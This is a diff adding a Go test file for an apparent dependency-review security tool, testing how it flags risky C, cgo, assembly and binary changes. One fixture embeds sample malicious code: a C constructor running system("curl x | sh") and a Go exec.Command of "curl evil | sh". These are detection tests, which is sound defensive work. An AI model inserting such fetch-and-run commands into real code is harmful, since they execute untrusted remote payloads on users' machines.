@@ -1,0 +1,200 @@
+package gomod
+
+import (
+	"fmt"
+	"path/filepath"
+	"slices"
+	"strings"
+	"testing"
+
+	"github.com/sadbox/dep-review/internal/eco/ecoutil"
+	"github.com/sadbox/dep-review/internal/eco/ecoutil/gittest"
+	"github.com/sadbox/dep-review/internal/model"
+)
+
+// TestFlaggedFullText (security review H1): the full new text of every
+// new or changed C or assembly file, cgo file and risky-import file is in
+// the focused evidence, whatever the diff shows (a rename hid it).
+func TestFlaggedFullText(t *testing.T) {
+	csrc := "#include <stdlib.h>\n__attribute__((constructor)) static void evil(void) { system(\"curl x | sh\"); }\n"
+	gosrc := "package p\n\nimport \"os/exec\"\n\nfunc Run() { exec.Command(\"sh\", \"-c\", \"curl evil | sh\").Run() }\n"
+	cgosrc := "package p\n\n// int f(void);\nimport \"C\"\n\nfunc G() { C.f(); evilGo() }\n"
+	asm := "TEXT ·f(SB),0,$0\n\tCALL runtime·evil(SB)\n\tRET\n"
+	oldF := map[string]string{"testdata/notes.txt": csrc, "testdata/sample.txt": gosrc, "testdata/c.txt": cgosrc, "testdata/a.txt": asm, "p.go": "package p\n"}
+	newF := map[string]string{"evil.c": csrc, "run.go": gosrc, "c.go": cgosrc, "x_amd64.s": asm, "p.go": "package p\n"}
+	h := CheckTrees(writeTree(t, oldF), writeTree(t, newF))
+	out := string(h.render("m"))
+	for _, want := range []string{
+		"    | __attribute__((constructor)) static void evil(void) { system(\"curl x | sh\"); }",
+		"    | func Run() { exec.Command(\"sh\", \"-c\", \"curl evil | sh\").Run() }",
+		"    | func G() { C.f(); evilGo() }",
+		"    | \tCALL runtime·evil(SB)",
+	} {
+		if !strings.Contains(out, want) {
+			t.Errorf("missing %q in:\n%s", want, out)
+		}
+	}
+}
+
+// TestDistinctItemCap (security review H2): the cap counts distinct
+// flagged items, not adds. One file with MaxFlagged new //go:generate
+// lines is one item, so a later .syso still gets its context.
+func TestDistinctItemCap(t *testing.T) {
+	var gen strings.Builder
+	gen.WriteString("package testdata\n\n")
+	for i := range model.MaxFlagged {
+		fmt.Fprintf(&gen, "//go:generate echo %d\n", i)
+	}
+	h := CheckTrees(nil, writeTree(t, map[string]string{
+		"a/gen.go":    gen.String(),
+		"z/evil.syso": string(coffObject(2, 64)),
+		"z/z.go":      "package z\n",
+	}))
+	if ctx := h.ctx[codeBinary]["z/evil.syso"]; len(ctx) == 0 || ctx[0] == skipped {
+		t.Errorf("2 flagged items, but the .syso context was skipped: %q", ctx)
+	}
+	// The .syso goes to a person for being a .syso, not for being skipped.
+	if got := h.items(codeIncomplete); !slices.Equal(got, []string{"gomod.binary-file z/evil.syso"}) {
+		t.Errorf("not shown in full: %q", got)
+	}
+}
+
+// TestSkippedGoesToAPerson (security review H2): wherever the "a person
+// decides" text is written, a person-routed finding says so.
+func TestSkippedGoesToAPerson(t *testing.T) {
+	cur := map[string]string{"p.go": "package p\n"}
+	for i := range model.MaxFlagged + 3 {
+		cur[fmt.Sprintf("c%03d.c", i)] = fmt.Sprintf("int f%d(void) { return 0; }\n", i)
+	}
+	cur["zz.syso"] = "\x00\x01 no parser"
+	h := CheckTrees(nil, writeTree(t, cur))
+	var human bool
+	for _, f := range h.findings("m") {
+		if f.Code == codeIncomplete && f.Route == model.RouteHuman {
+			human = true
+		}
+	}
+	if !human {
+		t.Errorf("context was skipped without a person-routed finding")
+	}
+	for code, items := range h.ctx {
+		for item, ctx := range items {
+			if slices.Contains(ctx, skipped) && !slices.Contains(h.items(codeIncomplete), code+" "+item) {
+				t.Errorf("%s %s skipped without its finding", code, item)
+			}
+		}
+	}
+}
+
+func TestBlobDecodeCharged(t *testing.T) {
+	lit := `"` + strings.Repeat("QUJD", 300) + `"`
+	out, _ := blobContext("b.go:1", lit, &ecoutil.Budget{Left: 10})
+	if !strings.Contains(out, "budget for this module is spent") || strings.Contains(out, "it decodes as") {
+		t.Errorf("blob decoded past the budget:\n%s", out)
+	}
+	b := &ecoutil.Budget{Left: 1 << 20}
+	blobContext("b.go:1", lit, b)
+	if b.Left > 1<<20-1200 {
+		t.Errorf("decoding charged %d bytes for a 1200-byte literal", 1<<20-b.Left)
+	}
+}
+
+// TestLinkedUnrendered (security review L1): a binary that reaches the
+// program and whose structure was not rendered goes to a person; one
+// used only by tests does not.
+func TestLinkedUnrendered(t *testing.T) {
+	broken := "\x7fELF\x02\x01\x01 truncated header"
+	cases := []struct {
+		name  string
+		files map[string]string
+		want  bool
+	}{
+		{"syso", map[string]string{"x.syso": broken, "p.go": "package p\n"}, true},
+		{"embedded by non-test code", map[string]string{"x.bin": broken, "p.go": "package p\n\nimport _ \"embed\"\n\n//go:embed x.bin\nvar b []byte\n"}, true},
+		// Round 4: routing rests on the rendering alone, linked or not.
+		// Round 5: a binary proven never to reach the build stays on review
+		// whatever its rendering.
+		{"embedded by a test", map[string]string{"x.bin": broken, "p.go": "package p\n", "p_test.go": "package p\n\nimport _ \"embed\"\n\n//go:embed x.bin\nvar b []byte\n"}, true},
+		{"unreferenced", map[string]string{"x.bin": broken, "p.go": "package p\n"}, true},
+		{"mentioned by non-test code", map[string]string{"x.bin": broken, "p.go": "package p\n\nconst f = \"x.bin\"\n"}, true},
+		// Round 8: a .syso is never cleared by its rendering.
+		{"complete COFF .syso", map[string]string{"x.syso": string(coffObject(2, 64)), "p.go": "package p\n"}, true},
+		// Informational (a): a .syso nothing can parse is linked and unread.
+		{"syso with no parser for its type", map[string]string{"x.syso": "\x00\x01 opaque", "p.go": "package p\n"}, true},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			h := CheckTrees(nil, writeTree(t, tc.files))
+			got := len(h.items(codeIncomplete)) > 0
+			if got != tc.want {
+				t.Errorf("linked-unrendered = %v, want %v (%q)", got, tc.want, h.items(codeIncomplete))
+			}
+			for _, f := range h.findings("m") {
+				if f.Code == codeIncomplete && f.Route != model.RouteHuman {
+					t.Errorf("route %s", f.Route)
+				}
+			}
+		})
+	}
+	// Budget spent: an ELF that would parse is not parsed.
+	h := newReport()
+	h.budget.Left = 0
+	tr := writeTree(t, map[string]string{"x.syso": broken, "p.go": "package p\n"})
+	h.binaries(nil, tr, []string{"x.syso"}, nil, embedResult{})
+	if len(h.items(codeIncomplete)) == 0 {
+		t.Errorf("a linked binary whose parse budget was spent did not go to a person")
+	}
+}
+
+// TestGroupedBumpFlaggedOnce (security review L3): the same module change
+// in two directories is flagged once, so the evidence's flagged list has
+// no repeated item (which publish refuses).
+func TestGroupedBumpFlaggedOnce(t *testing.T) {
+	if testing.Short() {
+		t.Skip("network")
+	}
+	base := gittest.ReadDir(t, filepath.Join("testdata", "towngear49", "base"))
+	head := gittest.ReadDir(t, filepath.Join("testdata", "towngear49", "head"))
+	for _, m := range []map[string][]byte{base, head} {
+		m["sub/go.mod"] = []byte(strings.Replace(string(m["go.mod"]), "module ", "module sub.", 1))
+		m["sub/go.sum"] = m["go.sum"]
+	}
+	dir, b, h := gittest.Repo(t, base, head)
+	class := model.Classification{Repo: "test/grouped", PR: 1, BaseSHA: b, HeadSHA: h, Kind: model.KindDependabot, Ecosystem: model.GoModules,
+		Declared: []model.Update{{Name: "golang.org/x/image", From: "0.47.0", To: "0.48.0"}}}
+	ev := runFetch(t, dir, class)
+	if len(ev.Flagged) == 0 {
+		t.Fatalf("nothing flagged; the test needs a module with flagged items (findings %+v)", ev.Findings)
+	}
+	seen := map[model.FlaggedItem]bool{}
+	for _, f := range ev.Flagged {
+		if seen[f] {
+			t.Fatalf("flagged twice: %+v", f)
+		}
+		seen[f] = true
+	}
+}
+
+// TestFlaggedUpdateKey (security review L3): a module changing
+// differently in two directories gives two keys, and the longest id the
+// gate can build fits the verdict's limit.
+func TestFlaggedUpdateKey(t *testing.T) {
+	a := flaggedUpdate(model.Update{Name: "example.com/m", From: "v1.0.0", To: "v1.2.0"})
+	b := flaggedUpdate(model.Update{Name: "example.com/m", From: "v1.1.0", To: "v1.2.0"})
+	if a == b {
+		t.Errorf("two different changes share the key %q", a)
+	}
+	long := strings.Repeat("a", maxDetailValue)
+	longVer := "v" + strings.Repeat("1", maxDetailValue-1)
+	ids := []string{
+		flaggedUpdate(safeUpdate(model.Update{Name: "x.com/" + long[:maxDetailValue-6], From: longVer, To: longVer})),
+		safeFile(long) + " (" + safeImport("x.com/"+long[:maxDetailValue-6]) + ")",
+		codeImport + " " + safeFile(long) + " (" + safeImport("x.com/"+long[:maxDetailValue-6]) + ")",
+		safeFile(long[:100]+"/"+long[:99]) + "/" + safeIdent(long),
+	}
+	for _, id := range ids {
+		if strings.HasPrefix(id, "<") || len(id) > model.MaxItemField {
+			t.Errorf("id of %d bytes (limit %d): %.80s", len(id), model.MaxItemField, id)
+		}
+	}
+}
